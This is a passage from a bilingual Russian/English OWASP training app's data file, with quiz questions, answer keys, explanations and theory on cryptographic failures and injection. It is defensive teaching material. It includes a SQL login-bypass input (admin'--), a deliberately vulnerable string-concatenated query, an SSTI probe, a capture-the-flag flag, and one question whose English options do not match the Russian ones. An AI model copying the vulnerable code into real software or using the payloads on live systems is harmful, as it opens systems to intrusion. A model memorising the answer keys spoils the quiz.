          M('анализа конфигурации TLS/SSL сервера — протоколов, cipher suites, сертификатов', 'analyze a server\'s TLS/SSL configuration — protocols, cipher suites, certificates'),
          M('брутфорса паролей', 'brute-force passwords'),
          M('статического анализа кода', 'statically analyze code'),
        ],
        ans: 1,
        e: M('testssl.sh анализирует TLS/SSL-конфигурацию сервера: поддерживаемые протоколы, cipher suites, сертификаты и типичные слабости.', 'testssl.sh analyzes a server\'s TLS/SSL configuration: supported protocols, cipher suites, certificates, and common weaknesses.'),
      },
      {
        q: M('Почему JWT, подписанный слабым/предсказуемым HMAC-секретом, представляет собой Cryptographic Failure?', 'Why is a JWT signed with a weak/predictable HMAC secret a Cryptographic Failure?'),
        opts: [
          M('Не является уязвимостью', 'It\'s not a vulnerability'),
          M('JWT никогда не подписываются', 'JWTs are never signed'),
          M('Атакующий может подобрать секрет брутфорсом и подделать валидный токен с произвольными правами', 'An attacker can brute-force the secret and forge a valid token with arbitrary claims'),
          M('JWT не поддерживает подпись в принципе', 'JWT doesn\'t support signatures at all'),
        ],
        ans: 2,
        e: M('Слабый HMAC-секрет JWT можно подобрать offline; атакующий затем подписывает токены с произвольными claims (роли, subject) — классический crypto failure.', 'A weak JWT HMAC secret can be brute-forced offline; the attacker then forges tokens with arbitrary claims (roles, subject) — a classic crypto failure.'),
      },
      {
        q: M('Термин «Sensitive Data Exposure» в текущей терминологии OWASP 2025 рассматривается как:', 'The term "Sensitive Data Exposure" in current OWASP 2025 terminology is treated as:'),
        opts: [
          M('синоним XSS', 'a synonym for XSS'),
          M('отдельная категория с собственным номером', 'a separate category with its own number'),
          M('устаревшее название для Injection', 'an outdated name for Injection'),
          M('симптом, а не root cause — конкретная причина, как правило, кроется в Cryptographic Failure', 'a symptom, not a root cause — the actual cause is usually a Cryptographic Failure'),
        ],
        ans: 3,
        e: M('В терминологии OWASP 2025 Sensitive Data Exposure — симптом; root cause обычно Cryptographic Failure (слабая/отсутствующая защита данных).', 'In OWASP 2025 terminology Sensitive Data Exposure is a symptom; the root cause is usually a Cryptographic Failure (weak or missing data protection).'),
      },
      {
        q: M('Что из перечисленного — правильная защита персональных данных при хранении, помимо шифрования?', 'Which of the following is a correct measure for protecting personal data at rest, beyond encryption?'),
        opts: [
          M('Токенизация/усечение (truncation) данных там, где полное значение не нужно бизнес-логике', 'Tokenization/truncation of data where the full value isn\'t needed by the business logic'),
          M('Хранение в plaintext для упрощения отладки', 'Storing it as plaintext for easier debugging'),
          M('Использование одного общего ключа для всех клиентов навсегда', 'Using one shared key for all customers forever'),
          M('Отказ от логирования вообще', 'Not logging anything at all'),
        ],
        ans: 0,
        e: M('Помимо шифрования, корректна токенизация/усечение: если бизнесу не нужно полное значение (например, PAN), хранят токен или маску, снижая риск утечки.', 'Beyond encryption, tokenization/truncation is correct: if the full value (e.g., PAN) is not needed, store a token or mask to reduce leak impact.'),
      },
      {
        q: M('Атакующий перехватывает трафик по HTTP (не HTTPS) между клиентом и сервером. Какая категория OWASP это описывает?', 'An attacker intercepts traffic sent over HTTP (not HTTPS) between a client and server. Which OWASP category does this describe?'),
        opts: [
          M('Logging Failure', 'Logging Failure'),
          M('Cryptographic Failure (данные in transit не защищены)', 'Cryptographic Failure (data in transit isn\'t protected)'),
          M('Injection', 'Injection'),
          M('Insecure Design', 'Insecure Design'),
        ],
        ans: 1,
        e: M('Перехват HTTP-трафика без TLS — отсутствие защиты данных in transit; это относится к A04 Cryptographic Failures.', 'Intercepting cleartext HTTP without TLS is unprotected data in transit and falls under A04 Cryptographic Failures.'),
      },
      {
        q: M('Что из перечисленного связано с «крипто-агильностью» (crypto agility)?', 'What does "crypto agility" refer to?'),
        opts: [
          M('Использование только одного алгоритма навсегда', 'Using only one algorithm forever'),
          M('Скорость шифрования данных', 'The speed of data encryption'),
          M('Способность системы легко заменить устаревший алгоритм на новый без полной переработки архитектуры', 'The system\'s ability to easily swap an outdated algorithm for a new one without a full architecture rewrite'),
          M('Отказ от использования библиотек шифрования', 'Avoiding encryption libraries'),
        ],
        ans: 2,
        e: M('Crypto agility — способность заменить устаревший алгоритм на новый без полной переработки архитектуры (конфигурируемые алгоритмы/параметры).', 'Crypto agility is the ability to swap an outdated algorithm for a new one without rewriting the whole architecture (configurable algorithms/parameters).'),
      },
      {
        q: M('Почему привязка алгоритма шифрования жёстко «зашитым» в код (hardcoded) кодом — плохая практика в контексте A04?', 'Why is a hardcoded encryption algorithm baked directly into the code a bad practice in the A04 context?'),
        opts: [
          M('Замедляет выполнение программы', 'It slows program execution'),
          M('Не влияет на безопасность', 'It doesn\'t affect security'),
          M('Требуется по стандарту PCI DSS', 'It\'s a PCI DSS requirement'),
          M('Затрудняет миграцию при обнаружении уязвимости алгоритма или появлении квантовых угроз в будущем', 'It complicates migration when the algorithm is found vulnerable or when future quantum threats emerge'),
        ],
        ans: 3,
        e: M('Жёстко зашитый в код алгоритм мешает миграции при поломке алгоритма или появлении постквантовых требований; нужна конфигурируемость и agility.', 'A hardcoded algorithm blocks migration when it is broken or post-quantum needs arise; configurability and crypto agility are required.'),
      },
      {
        q: M('Какая из мер напрямую относится к защите данных «at rest»?', 'Which measure directly relates to protecting data "at rest"?'),
        opts: [
          M('Full disk encryption / шифрование БД на уровне столбцов для чувствительных полей', 'Full disk encryption / column-level DB encryption for sensitive fields'),
          M('HSTS', 'HSTS'),
          M('SameSite cookie', 'SameSite cookie'),
          M('CSP', 'CSP'),
        ],
        ans: 0,
        e: M('Защита at rest — full disk encryption и/или шифрование чувствительных полей БД; это не заменяет TLS in transit, но закрывает данные на носителе.', 'Data-at-rest protection is full-disk encryption and/or column-level DB encryption for sensitive fields — complementary to TLS in transit.'),
      },
      {
        q: M('Что из перечисленного лучше всего описывает разницу между шифрованием симметричным и асимметричным в контексте практического применения?', 'Which of the following best describes the practical difference between symmetric and asymmetric encryption?'),
        opts: [
          M('Они идентичны по скорости и назначению', 'They\'re identical in speed and purpose'),
          M('Симметричное использует один общий ключ (быстрее, для больших объёмов данных), асимметричное — пару ключей (медленнее, для обмена ключами/подписи)', 'Symmetric uses one shared key (faster, for bulk data), asymmetric uses a key pair (slower, for key exchange/signing)'),
          M('Асимметричное всегда быстрее', 'Asymmetric is always faster'),
          M('Симметричное вообще не используется в TLS', 'Symmetric is never used in TLS'),
        ],
        ans: 1,
        e: M('Симметричная криптография использует один общий ключ (быстро, для объёмов данных); асимметричная — пару ключей (медленнее, обмен ключами и подписи).', 'Symmetric crypto uses one shared key (fast, bulk data); asymmetric uses a key pair (slower, key exchange and signing).'),
      },
      {
        q: M('Согласно OWASP A04:2025, категория содержит:', 'Per OWASP A04:2025, how many CWEs does the category contain?'),
        opts: [
          M('40 CWE', '40 CWEs'),
          M('6 CWE', '6 CWEs'),
          M('32 CWE', '32 CWEs'),
          M('16 CWE', '16 CWEs'),
        ],
        ans: 2,
        e: M('Согласно OWASP A04:2025, категория Cryptographic Failures содержит 32 CWE.', 'Per OWASP A04:2025, the Cryptographic Failures category contains 32 CWEs.'),
      },
      {
        q: M('Почему проверка на «предсказуемость» токенов сброса пароля важна с точки зрения криптографии?', 'Why does checking password-reset token "predictability" matter cryptographically?'),
        opts: [
          M('Токены должны быть короткими для удобства', 'Tokens should be short for convenience'),
          M('Токены никогда не должны истекать', 'Tokens should never expire'),
          M('Не имеет значения', 'It doesn\'t matter'),
          M('Токен должен генерироваться криптографически стойким генератором случайных чисел с достаточной энтропией, иначе атакующий может подобрать/предсказать его', 'The token must be generated by a cryptographically strong random number generator with sufficient entropy, or an attacker can guess/predict it'),
        ],
        ans: 3,
        e: M('Токен сброса пароля должен генерироваться CSPRNG с достаточной энтропией; предсказуемый токен позволяет захватить чужой аккаунт.', 'Password-reset tokens must come from a CSPRNG with enough entropy; a predictable token lets an attacker take over the account.'),
      },
      {
        q: M('Разница между hashing и encryption:', 'The difference between hashing and encryption:'),
        opts: [
          M('хеширование — необратимая операция (для проверки целостности/паролей), шифрование — обратимая при наличии ключа (для конфиденциальности)', 'hashing is one-way (for integrity checks/passwords), encryption is reversible with a key (for confidentiality)'),
          M('хеширование используется только для файлов', 'hashing is used only for files'),
          M('это одно и то же', 'they\'re the same thing'),
          M('шифрование необратимо, хеширование обратимо', 'encryption is irreversible, hashing is reversible'),
        ],
        ans: 0,
        e: M('Хеширование необратимо (проверка целостности/паролей); шифрование обратимо при наличии ключа и служит для конфиденциальности.', 'Hashing is one-way (integrity checks/passwords); encryption is reversible with a key and serves confidentiality.'),
      },
      {
        q: M('Какая из перечисленных ситуаций представляет наибольший риск с точки зрения A04?', 'Which of the following poses the greatest risk from an A04 perspective?'),
        opts: [
          M('Ротация ключей раз в год по политике', 'Rotating keys once a year per policy'),
          M('Хранение номеров банковских карт в открытом виде в логах приложения', 'Storing credit card numbers in plaintext in application logs'),
          M('Использование TLS 1.3 с современными cipher suites', 'Using TLS 1.3 with modern cipher suites'),
          M('Использование bcrypt для паролей', 'Using bcrypt for passwords'),
        ],
        ans: 1,
        e: M('Номера карт в открытом виде в логах — прямая утечка чувствительных платёжных данных, высокий риск A04/PCI DSS.', 'Plaintext card numbers in application logs are a direct leak of sensitive payment data — high A04/PCI DSS risk.'),
      },
      {
        q: M('MITM-атака (Man-in-the-Middle) наиболее эффективно предотвращается через:', 'A MITM attack is most effectively prevented by:'),
        opts: [
          M('rate limiting', 'rate limiting'),
          M('CAPTCHA', 'CAPTCHA'),
          M('корректно настроенный TLS с валидацией сертификатов (certificate pinning в мобильных приложениях как доп. мера)', 'properly configured TLS with certificate validation (certificate pinning in mobile apps as an extra measure)'),
          M('сложные пароли пользователей', 'complex user passwords'),
        ],
        ans: 2,
        e: M('MITM лучше всего предотвращается корректным TLS с проверкой сертификатов; в мобильных приложениях дополнительно применяют certificate pinning.', 'MITM is best prevented by properly configured TLS with certificate validation; mobile apps may add certificate pinning.'),
      },
      {
        q: M('Что из перечисленного иллюстрирует «крипто-failure», а не «недостаток дизайна» (Insecure Design)?', 'Which of the following illustrates a "crypto failure" rather than a "design flaw" (Insecure Design)?'),
        opts: [
          M('Отсутствие rate limiting в бизнес-логике', 'Absence of rate limiting in business logic'),
          M('Отсутствие threat modeling для новой фичи', 'Lack of threat modeling for a new feature'),
          M('Отсутствие проверки лимитов промокодов', 'Absence of promo-code limit checks'),
          M('Использование MD5 для хеширования паролей в существующей, иначе неплохо спроектированной системе', 'Using MD5 for password hashing in an otherwise reasonably designed system'),
        ],
        ans: 3,
        e: M('MD5 для паролей при в целом приемлемом дизайне — ошибка выбора/применения криптопримитива (A04), а не отсутствие threat modeling как Insecure Design.', 'Using MD5 for passwords in an otherwise reasonable system is a crypto-primitive failure (A04), not primarily an Insecure Design threat-modeling gap.'),
      },
      {
        q: M('Согласно рекомендациям OWASP, чувствительные данные должны быть зашифрованы:', 'Per OWASP recommendations, sensitive data should be encrypted:'),
        opts: [
          M('и at rest, и in transit современными проверенными алгоритмами', 'both at rest AND in transit, using modern proven algorithms'),
          M('только in transit', 'only in transit'),
          M('шифрование не требуется при использовании VPN', 'encryption isn\'t required if a VPN is used'),
          M('только at rest', 'only at rest'),
        ],
        ans: 0,
        e: M('OWASP требует шифровать чувствительные данные и at rest, и in transit современными проверенными алгоритмами и протоколами.', 'OWASP requires encrypting sensitive data both at rest and in transit with modern, proven algorithms and protocols.'),
      },
      {
        q: M('Какой инструмент/техника чаще всего используется для поиска хардкод-секретов (API-ключей, паролей) в исходном коде на пентесте?', 'Which tool/technique is most often used to find hardcoded secrets (API keys, passwords) in source code during a pentest?'),
        opts: [
          M('Metasploit', 'Metasploit'),
          M('truffleHog/gitleaks и аналогичные секрет-сканеры + ручной grep по коммитам', 'truffleHog/gitleaks and similar secret scanners + manual grep through commits'),
          M('sqlmap', 'sqlmap'),
          M('Nikto', 'Nikto'),
        ],
        ans: 1,
        e: M('Хардкод-секреты ищут secret-сканерами (truffleHog, gitleaks) и ручным grep по истории коммитов — типичная техника на пентесте.', 'Hardcoded secrets are found with scanners (truffleHog, gitleaks) plus manual grep of commit history — a common pentest technique.'),
      },
      {
        q: M('Почему «отсутствие проверки сертификата» (например, verify=False в requests библиотеке Python) — частая находка на код-ревью и представляет риск?', 'Why is "lack of certificate verification" (e.g., verify=False in Python\'s requests library) a common code-review finding and a risk?'),
        opts: [
          M('Улучшает производительность без рисков', 'It improves performance without risk'),
          M('Замедляет запросы', 'It slows down requests'),
          M('Полностью отключает защиту от MITM-атак для этого HTTP-клиента', 'It completely disables MITM protection for that HTTP client'),
          M('Требуется для работы с самоподписанными сертификатами всегда безопасно', 'It\'s always safe when working with self-signed certificates'),
        ],
        ans: 2,
        e: M('verify=False (и аналоги) полностью отключает проверку сертификата HTTP-клиента и снимает защиту от MITM — критичная находка код-ревью.', 'verify=False (and equivalents) fully disables certificate verification for that HTTP client and removes MITM protection — a critical code-review finding.'),
      },
      {
        q: M('Что из перечисленного описывает разницу между Confidentiality и Integrity в контексте криптографии?', 'Which of the following describes the difference between Confidentiality and Integrity in a cryptography context?'),
        opts: [
          M('Это синонимы', 'They\'re synonyms'),
          M('Confidentiality относится только к паролям', 'Confidentiality only applies to passwords'),
          M('Integrity относится только к сетевым протоколам', 'Integrity only applies to network protocols'),
          M('Confidentiality — защита от несанкционированного чтения (шифрование), Integrity — защита от несанкционированного изменения (хеш/подпись/MAC)', 'Confidentiality protects against unauthorized reading (encryption), Integrity protects against unauthorized modification (hash/signature/MAC)'),
        ],
        ans: 3,
        e: M('Confidentiality — защита от несанкционированного чтения (шифрование); Integrity — защита от несанкционированного изменения (хеш, MAC, подпись).', 'Confidentiality protects against unauthorized reading (encryption); Integrity protects against unauthorized modification (hash, MAC, signature).'),
      },
      {
        q: M('HMAC используется для:', 'HMAC is used to:'),
        opts: [
          M('проверки целостности и подлинности сообщения с использованием секретного ключа', 'verify a message\'s integrity and authenticity using a secret key'),
          M('сжатия данных', 'compress data'),
          M('генерации случайных чисел', 'generate random numbers'),
          M('шифрования данных', 'encrypt data'),
        ],
        ans: 0,
        e: M('HMAC проверяет целостность и подлинность сообщения с помощью общего секретного ключа — аутентифицированный MAC, не шифрование.', 'HMAC verifies message integrity and authenticity with a shared secret key — an authenticated MAC, not encryption.'),
      },
      {
        q: M('Верно ли, что использование HTTPS автоматически решает все проблемы категории A04?', 'Is it true that using HTTPS automatically solves all A04 issues?'),
        opts: [
          M('Нет, HTTPS не относится к A04 вообще', 'No, HTTPS is unrelated to A04 at all'),
          M('Нет — HTTPS защищает только данные in transit; данные at rest, хранение паролей и управление ключами требуют отдельных мер', 'No — HTTPS only protects data in transit; data at rest, password storage, and key management require separate measures'),
          M('Да, полностью', 'Yes, completely'),
          M('Да, если сертификат от Let\'s Encrypt', 'Yes, if the certificate is from Let\'s Encrypt'),
        ],
        ans: 1,
        e: M('HTTPS закрывает только in transit; at rest, хранение паролей, управление ключами и отказ от слабых алгоритмов требуют отдельных мер A04.', 'HTTPS only protects data in transit; at-rest data, password storage, key management, and avoiding weak algorithms need separate A04 controls.'),
      },
      {
        q: M('Что из перечисленного — пример правильной архитектуры хранения платёжных данных согласно принципам A04/PCI DSS?', 'Which of the following is an example of correct payment-data storage architecture per A04/PCI DSS principles?'),
        opts: [
          M('Отправка номера карты по email в открытом виде для подтверждения', 'Emailing the card number in plaintext for confirmation'),
          M('Хранение полного номера карты в собственной БД в открытом виде', 'Storing the full card number in your own DB in plaintext'),
          M('Токенизация через платёжный процессор — приложение хранит только токен, не сами данные карты', 'Tokenization via a payment processor — the app stores only a token, not the actual card data'),
          M('Хранение номера карты в логах для отладки', 'Storing the card number in logs for debugging'),
        ],
        ans: 2,
        e: M('Правильная архитектура PCI: токенизация через платёжный процессор — приложение хранит только токен, а не полный PAN/CVV.', 'Correct PCI-aligned architecture: tokenize via a payment processor so the app stores only a token, not full PAN/CVV.'),
      },
      {
        q: M('Какая мера наиболее эффективна против атаки типа «offline brute-force» на украденную базу хешей паролей?', 'Which measure is most effective against an "offline brute-force" attack on a stolen database of password hashes?'),
        opts: [
          M('Ограничение попыток входа через веб-форму (не влияет на офлайн-атаку)', 'Limiting login attempts via the web form (doesn\'t affect an offline attack)'),
          M('Использование Base64 поверх пароля перед хешированием', 'Base64-encoding the password before hashing'),
          M('Увеличение длины пароля на сайте регистрации только', 'Only increasing the minimum password length on the sign-up page'),
          M('Использование медленной, ресурсоёмкой хеш-функции с солью (Argon2id/bcrypt/scrypt) с адекватным cost-фактором, а не быстрого хеша', 'Using a slow, resource-intensive salted hash function (Argon2id/bcrypt/scrypt) with an adequate cost factor, rather than a fast hash'),
        ],
        ans: 3,
        e: M('Против offline brute-force на украденных хешах эффективны медленные salted KDF (Argon2id/bcrypt/scrypt) с адекватным cost, а не быстрые хеши.', 'Against offline brute-force on stolen hashes, use slow salted KDFs (Argon2id/bcrypt/scrypt) with adequate cost — not fast hashes.'),
      },
    ],
  },
  {
    code: 'A03', name: 'Injection', nameRu: 'Инъекции',
    risk: 'HIGH', owasp2021: 'A03', owasp2025: 'A05',
    cwe: ['CWE-89', 'CWE-78', 'CWE-79', 'CWE-90'],
    flag: 'FLAG{sqli_login_bypass_comment}',
    blurb: M('SQL-инъекции, XSS и внедрение команд ОС: данные превращаются в код.', 'SQLi, XSS, OS command injection — data becomes code.'),
    theory: M(
`<p><strong>Injection</strong> — пользовательские данные попадают в интерпретатор (SQL, shell, LDAP, NoSQL, template) как код.</p>
<div class="ebox">query = "SELECT * FROM users WHERE name='" + input + "'"
// input = admin'--
// → SELECT * FROM users WHERE name='admin'--'</div>
<p>Защита: <strong>prepared statements</strong>, output encoding (XSS), avoid shell, allowlists.</p>
<p><strong>CVE-2014-6271 ShellShock</strong>, <strong>CVE-2022-26134 Confluence OGNL</strong>.</p>`,
`<p><strong>Injection</strong> — user data reaches an interpreter (SQL, shell, LDAP, NoSQL, template) as code.</p>
<div class="ebox">query = "SELECT * FROM users WHERE name='" + input + "'"
// input = admin'--
// → SELECT * FROM users WHERE name='admin'--'</div>
<p>Defense: <strong>prepared statements</strong>, output encoding (XSS), avoid shell, allowlists.</p>
<p><strong>CVE-2014-6271 ShellShock</strong>, <strong>CVE-2022-26134 Confluence OGNL</strong>.</p>`
    ),
    vulnCode: `// String concat = SQLi
const q = \`SELECT * FROM users
  WHERE username='\${user}' AND password='\${pass}'\`;
db.exec(q);`,
    fixCode: `// Prepared statement
const row = db.prepare(
  'SELECT * FROM users WHERE username=? AND password=?'
).get(user, pass);`,
    quiz: [
      {
        q: M('Сколько CWE входит в категорию A05:2025 — наибольшее число среди всех категорий?', 'How many CWEs are in category A05:2025 — the largest number of any category?'),
        opts: [
          M('38', '38'),
          M('40', '40'),
          M('16', '16'),
          M('24', '24'),
        ],
        ans: 0,
        e: M('По данным OWASP Top 10:2025 категория A05 Injection включает наибольшее число CWE — 38, что отражает широту семейства инъекций (SQL, XSS, command, SSTI и др.).', 'Per OWASP Top 10:2025, A05 Injection maps the largest set of CWEs — 38 — reflecting the breadth of injection families (SQL, XSS, command, SSTI, and others).'),
      },
      {
        q: M('Root cause категории Injection — это:', 'The root cause of the Injection category is:'),
        opts: [
          M('слабый пароль', 'a weak password'),
          M('отсутствие разделения между control plane и data plane при построении запроса/команды (конкатенация вместо параметризации)', 'the lack of separation between the control plane and data plane when building a query/command (concatenation instead of parameterization)'),
          M('неправильная конфигурация сервера', 'incorrect server configuration'),
          M('отсутствие HTTPS', 'lack of HTTPS'),
        ],
        ans: 1,
        e: M('Корневая причина Injection — смешивание данных и управляющих инструкций: пользовательский ввод конкатенируется в запрос/команду вместо параметризации. Поэтому payload может изменить структуру или семантику операции.', 'Injection’s root cause is mixing data with control instructions: user input is concatenated into a query/command instead of being parameterized. That lets a payload change the structure or semantics of the operation.'),
      },
      {
        q: M('Какой тип SQL-инъекции определяется по разнице во времени ответа сервера?', 'Which type of SQL injection is identified by a difference in server response time?'),
        opts: [
          M('Error-based', 'Error-based'),
          M('Stacked queries', 'Stacked queries'),
          M('Time-based blind', 'Time-based blind'),
          M('UNION-based', 'UNION-based'),
        ],
        ans: 2,
        e: M('Time-based blind SQL Injection выявляется по задержке ответа (например, SLEEP/WAITFOR), когда данные и ошибки не отражаются напрямую. Разница во времени подтверждает выполнение условия в СУБД.', 'Time-based blind SQL injection is identified by response delay (e.g., SLEEP/WAITFOR) when data and errors are not returned directly. Timing differences confirm the condition executed in the DBMS.'),
      },
      {
        q: M('Boolean-based blind SQL Injection определяется через:', 'Boolean-based blind SQL Injection is identified through:'),
        opts: [
          M('HTTP-заголовки', 'HTTP headers'),
          M('время ответа сервера', 'server response time'),
          M('вывод текста ошибки СУБД', 'the DBMS error text output'),
          M('разницу в содержимом/поведении отклика при истинном/ложном условии запроса', 'a difference in the response content/behavior for a true vs. false query condition'),
        ],
        ans: 3,
        e: M('Boolean-based blind SQLi опирается на изменение содержимого или поведения ответа при истинном и ложном условии, а не на текст ошибки или паузу. По разнице ответов атакующий побитово извлекает данные.', 'Boolean-based blind SQLi relies on differing response content or behavior for true vs. false conditions, not error text or delays. Those differences let an attacker extract data bit by bit.'),
      },
      {
        q: M('Second-order SQL Injection — это ситуация, когда:', 'Second-order SQL Injection is a situation where:'),
        opts: [
          M('вредоносный payload сохраняется в БД и срабатывает позже при использовании в другом запросе', 'a malicious payload is stored in the DB and fires later when used in a different query'),
          M('инъекция работает только через второй параметр', 'the injection only works via a second parameter'),
          M('инъекция требует двух пользователей одновременно', 'the injection requires two users simultaneously'),
          M('инъекция срабатывает мгновенно при вводе', 'the injection fires instantly upon input'),
        ],
        ans: 0,
        e: M('Second-order SQL Injection: payload сохраняется «безопасно», а затем подставляется в другой запрос без параметризации и срабатывает позже. Поэтому недостаточно проверять только точку ввода.', 'In second-order SQL injection the payload is stored “safely,” then later reused in another query without parameterization and fires there. Validating only the initial input point is not enough.'),
      },
      {
        q: M('SSTI (Server-Side Template Injection) чаще всего приводит к:', 'SSTI (Server-Side Template Injection) most often leads to:'),
        opts: [
          M('утечке cookie только', 'cookie theft only'),
          M('RCE — инъекция в шаблонизатор (Jinja2, Twig, FreeMarker) позволяет выполнить произвольный код на сервере', 'RCE — injecting into a template engine (Jinja2, Twig, FreeMarker) allows arbitrary code execution on the server'),
          M('XSS только', 'XSS only'),
          M('DoS только', 'DoS only'),
        ],
        ans: 1,
        e: M('SSTI даёт выполнение доступ к API шаблонизатора (Jinja2, Twig, FreeMarker), что часто приводит к RCE на сервере, а не только к XSS. Это серверная инъекция управляющей логики шаблона.', 'SSTI injects into the template engine’s API (Jinja2, Twig, FreeMarker), often yielding server-side RCE rather than mere XSS. It is server-side injection into template control logic.'),
      },
      {
        q: M('Payload {{7*7}} в поле ввода используется для тестирования:', 'The payload {{7*7}} in an input field is used to test for:'),
        opts: [
          M('XSS', 'XSS'),
          M('LDAP Injection', 'LDAP Injection'),
          M('SSTI (если в отклике появится 49 — шаблонизатор уязвим)', 'SSTI (if 49 appears in the response, the template engine is vulnerable)'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 2,
        e: M('Payload {{7*7}} — классический пробник SSTI: если в ответе появляется 49, сервер вычислил выражение шаблона. Это отличает SSTI от простого отражения текста.', 'The {{7*7}} payload is a classic SSTI probe: if the response shows 49, the server evaluated the template expression. That differs from mere text reflection.'),
      },
      {
        q: M('Reflected XSS отличается от Stored XSS тем, что:', 'Reflected XSS differs from Stored XSS in that:'),
        opts: [
          M('reflected работает только в Internet Explorer', 'reflected only works in Internet Explorer'),
          M('это одно и то же', 'they\'re the same thing'),
          M('reflected сохраняется в БД навсегда', 'reflected is permanently saved to the DB'),
          M('reflected срабатывает немедленно из параметров запроса и требует, чтобы жертва перешла по специальной ссылке, тогда как stored сохраняется на сервере и поражает всех посетителей страницы', 'reflected fires immediately from request parameters and requires the victim to follow a crafted link, while stored persists server-side and hits every visitor of the page'),
        ],
        ans: 3,
        e: M('Reflected XSS срабатывает сразу из параметров текущего запроса и обычно требует, чтобы жертва открыла вредоносную ссылку. Stored XSS сохраняется на сервере и поражает последующих посетителей страницы.', 'Reflected XSS fires immediately from the current request’s parameters and usually needs the victim to open a crafted link. Stored XSS persists server-side and hits later visitors of the page.'),
      },
      {
        q: M('DOM-based XSS отличается от Reflected/Stored тем, что:', 'DOM-based XSS differs from Reflected/Stored in that:'),
        opts: [
          M('уязвимость реализуется полностью на стороне клиента через небезопасную работу JS с DOM, без участия сервера в отражении payload', 'the vulnerability is entirely client-side, via unsafe JS handling of the DOM, without the server reflecting the payload'),
          M('требует SQL-базы', 'it requires an SQL database'),
          M('вообще не существует', 'it doesn\'t exist at all'),
          M('работает только через cookies', 'it only works through cookies'),
        ],
        ans: 0,
        e: M('DOM-based XSS возникает целиком на клиенте: небезопасный JS читает untrusted данные и пишет их в DOM, даже если сервер payload не «отражал» в HTML. Защита — безопасные API DOM и контекстное экранирование на клиенте.', 'DOM-based XSS is entirely client-side: unsafe JS reads untrusted data and writes it into the DOM even if the server never reflected the payload in HTML. Defend with safe DOM APIs and client-side context-aware encoding.'),
      },
      {
        q: M('NoSQL Injection в MongoDB часто эксплуатируется через операторы вида:', 'NoSQL Injection in MongoDB is often exploited via operators such as:'),
        opts: [
          M('XPath expressions', 'XPath expressions'),
          M('$where, $ne в JSON-параметрах', '$where, $ne in JSON parameters'),
          M('LDAP filter syntax', 'LDAP filter syntax'),
          M('UNION SELECT', 'UNION SELECT'),
        ],
        ans: 1,
        e: M('NoSQL-инъекции в MongoDB часто используют операторы вроде $ne и $where в JSON-параметрах, меняя логику запроса. Классический UNION SELECT здесь не применим.', 'NoSQL injection in MongoDB often abuses operators such as $ne and $where in JSON parameters to alter query logic. Classic UNION SELECT does not apply here.'),
      },
      {
        q: M('OS Command Injection возникает, когда:', 'OS Command Injection occurs when:'),
        opts: [
          M('отсутствует rate limiting', 'it isn\'t a real risk'),
          M('используется устаревший TLS', 'rate limiting is absent'),
          M('пользовательский ввод напрямую передаётся в системный вызов (exec/system/backticks) без санитизации', 'user input is passed directly into a system call (exec/system/backticks) without sanitization'),
          M('Не относится к данному классу уязвимостей', 'Does not belong to this vulnerability class'),
        ],
        ans: 2,
        e: M('OS Command Injection возникает, когда ввод пользователя передаётся в shell/system API без разделения аргументов и экранирования. Тогда спецсимволы shell могут запустить произвольные команды.', 'OS command injection occurs when user input is passed into a shell/system API without argument separation and escaping. Shell metacharacters can then launch arbitrary commands.'),
      },
      {
        q: M('Параметризованные запросы (prepared statements) защищают от SQL Injection, потому что:', 'Parameterized queries (prepared statements) protect against SQL Injection because:'),
        opts: [
          M('ускоряют выполнение запроса', 'they speed up query execution'),
          M('шифруют запрос', 'they encrypt the query'),
          M('требуют меньше памяти', 'they require less memory'),
          M('СУБД заранее компилирует структуру запроса отдельно от данных, поэтому пользовательский ввод не может изменить логику запроса', 'the DBMS precompiles the query structure separately from the data, so user input can\'t alter the query\'s logic'),
        ],
        ans: 3,
        e: M('Prepared statements компилируют структуру SQL отдельно от значений параметров, поэтому ввод не может изменить синтаксис запроса. Данные остаются данными, а не частью control plane.', 'Prepared statements compile SQL structure separately from parameter values, so input cannot change query syntax. Data stays data rather than part of the control plane.'),
      },
      {
        q: M('Контекстно-зависимое экранирование вывода для XSS означает:', 'Context-aware output escaping for XSS means:'),
        opts: [
          M('способ экранирования различается в зависимости от места вставки данных в DOM (HTML-тег, атрибут, JS-строка, URL)', 'the escaping method differs depending on where data is inserted into the DOM (HTML tag, attribute, JS string, URL)'),
          M('экранирование не требуется при использовании HTTPS', 'escaping isn\'t needed if HTTPS is used'),
          M('достаточно только серверной валидации ввода', 'server-side input validation alone is sufficient'),
          M('одно универсальное экранирование подходит для всех случаев', 'one universal escaping method works for all cases'),
        ],
        ans: 0,
        e: M('Контекстное экранирование XSS выбирает правила под место вставки: HTML-текст, атрибут, JS-строка, URL — у каждого свой набор опасных символов. Универсальный «escape HTML» часто недостаточен.', 'Context-aware XSS encoding picks rules for the insertion site: HTML text, attribute, JS string, or URL each has different dangerous characters. Generic “escape HTML” is often insufficient.'),
      },
      {
        q: M('CSP (Content-Security-Policy) снижает риск XSS, потому что:', 'CSP (Content-Security-Policy) reduces XSS risk because:'),
        opts: [
          M('полностью устраняет XSS без других мер', 'it fully eliminates XSS with no other measures needed'),
          M('ограничивает источники, из которых браузер может исполнять скрипты, работая как defense-in-depth даже при наличии XSS-инъекции', 'it restricts the sources browsers can execute scripts from, acting as defense-in-depth even when an XSS injection is present'),
          M('шифрует cookie', 'it encrypts cookies'),
          M('блокирует SQL-запросы', 'it blocks SQL queries'),
        ],
        ans: 1,
        e: M('CSP ограничивает источники и способы исполнения скриптов в браузере и служит defense-in-depth даже при наличии XSS. Сама по себе она не заменяет корректное экранирование вывода.', 'CSP restricts which scripts a browser may load and execute and acts as defense-in-depth even when XSS exists. It does not replace correct output encoding by itself.'),
      },
      {
        q: M('CRLF Injection (Header Injection) может привести к:', 'CRLF Injection (Header Injection) can lead to:'),
        opts: [
          M('DoS через переполнение буфера', 'DoS via buffer overflow'),
          M('утечке памяти', 'memory leaks'),
          M('HTTP response splitting и связанным атакам (например, кэш-poisoning, XSS через заголовки)', 'HTTP response splitting and related attacks (e.g., cache poisoning, XSS via headers)'),
          M('SQL-инъекции', 'SQL injection'),
        ],
        ans: 2,
        e: M('CRLF/Header Injection позволяет внедрять переводы строк в HTTP-заголовки, что ведёт к response splitting, cache poisoning и XSS через подмену ответа. Нужна валидация и запрет CR/LF во вводе для заголовков.', 'CRLF/header injection injects line breaks into HTTP headers, enabling response splitting, cache poisoning, and XSS via response rewriting. Validate input and ban CR/LF in header values.'),
      },
      {
        q: M('XXE (XML External Entity) относится к инъекции, потому что:', 'XXE (XML External Entity) is classed as an injection because:'),
        opts: [
          M('работает только в PDF', 'it\'s unrelated to injection'),
